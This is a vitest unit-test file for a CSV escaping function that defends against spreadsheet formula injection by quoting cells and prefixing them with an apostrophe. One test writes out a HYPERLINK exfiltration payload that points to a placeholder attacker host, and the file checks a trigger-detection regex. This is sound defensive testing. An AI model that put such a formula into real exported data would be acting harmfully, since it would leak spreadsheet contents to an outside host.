import { describe, expect, it } from "vitest";
import { escapeCsvCompat, CSV_FORMULA_TRIGGER_RE } from "./csv-escape";

describe("escapeCsvCompat", () => {
  it("returns empty string for null/empty", () => {
    expect(escapeCsvCompat(null)).toBe("");
    expect(escapeCsvCompat("")).toBe("");
  });

  it("leaves a plain value unquoted (compatibility format)", () => {
    expect(escapeCsvCompat("hello")).toBe("hello");
  });

  it("quote-wraps a value containing a comma", () => {
    expect(escapeCsvCompat("a,b")).toBe('"a,b"');
  });

  it("doubles embedded quotes and wraps", () => {
    expect(escapeCsvCompat('a"b')).toBe('"a""b"');
  });

  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "neutralizes a formula-triggering cell starting with %j",
    (trigger) => {
      const out = escapeCsvCompat(`${trigger}cmd`);
      // Must be quote-wrapped with a leading apostrophe so the spreadsheet
      // treats it as literal text, not a formula.
      expect(out).toBe(`"'${trigger}cmd"`);
    }
  );

  it("neutralizes the HYPERLINK exfiltration payload", () => {
    const out = escapeCsvCompat('=HYPERLINK("http://attacker/"&C2)');
    expect(out.startsWith("\"'=")).toBe(true);
  });

  it("applies RS6 ordering: quote-doubling runs before the formula decision", () => {
    // A value that both starts with a trigger AND contains a quote.
    const out = escapeCsvCompat('="x"');
    expect(out).toBe('"\'=""x"""');
  });

  it("CSV_FORMULA_TRIGGER_RE matches only leading trigger chars", () => {
    expect(CSV_FORMULA_TRIGGER_RE.test("=a")).toBe(true);
    expect(CSV_FORMULA_TRIGGER_RE.test("a=b")).toBe(false);
  });

  it("neutralizes a formula-triggering cell with leading whitespace", () => {
    const out = escapeCsvCompat("  =HYPERLINK(...)");
    expect(out).toBe("\"'  =HYPERLINK(...)\"");
  });

  it("neutralizes a leading tab-space mix before a trigger char", () => {
    const out = escapeCsvCompat("\t =cmd");
    expect(out).toBe("\"'\t =cmd\"");
  });

  it("neutralizes a leading newline before a trigger char", () => {
    const out = escapeCsvCompat("\n=cmd");
    expect(out).toBe('"\'\n=cmd"');
  });

  it("leaves an interior trigger char (not leading) unprefixed and unquoted", () => {
    expect(escapeCsvCompat("a =b")).toBe("a =b");
  });

  it("CSV_FORMULA_TRIGGER_RE matches leading whitespace before a trigger char", () => {
    expect(CSV_FORMULA_TRIGGER_RE.test("  =a")).toBe(true);
    expect(CSV_FORMULA_TRIGGER_RE.test("\n=a")).toBe(true);
  });

  it("CSV_FORMULA_TRIGGER_RE does not match a non-triggering leading run", () => {
    expect(CSV_FORMULA_TRIGGER_RE.test("a=b")).toBe(false);
    expect(CSV_FORMULA_TRIGGER_RE.test("  a")).toBe(false);
  });
});
